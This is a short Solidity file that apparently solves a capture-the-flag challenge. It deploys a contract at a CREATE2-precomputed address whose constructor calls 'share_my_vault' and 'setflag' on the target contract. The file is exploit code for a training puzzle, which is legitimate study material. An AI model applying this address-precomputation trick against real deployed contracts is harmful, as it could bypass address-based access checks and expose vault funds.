pragma solidity ^0.6.12;

import "./create2.sol";
import "forge-std/console.sol";

contract SolveExist {
    constructor(address contract_address) public {
        Existing e = Existing(contract_address);
        e.share_my_vault();
        e.setflag();
    }
}

contract Create2Deployer {
    function deploy(bytes32 salt, address contract_addr) public returns (address) {
        SolveExist s = new SolveExist{salt: salt}(contract_addr);
        return address(s);
    }

    function getBytecode(address contract_address) public pure returns (bytes memory) {
        bytes memory byteCode = type(SolveExist).creationCode;

        return abi.encodePacked(byteCode, abi.encode(contract_address));
    }

    function getDeployAddress(address contract_address, bytes32 salt) public view returns (address) {
        bytes32 hash =
            keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(getBytecode(contract_address))));
        return address(uint160(uint256(hash)));
    }
}
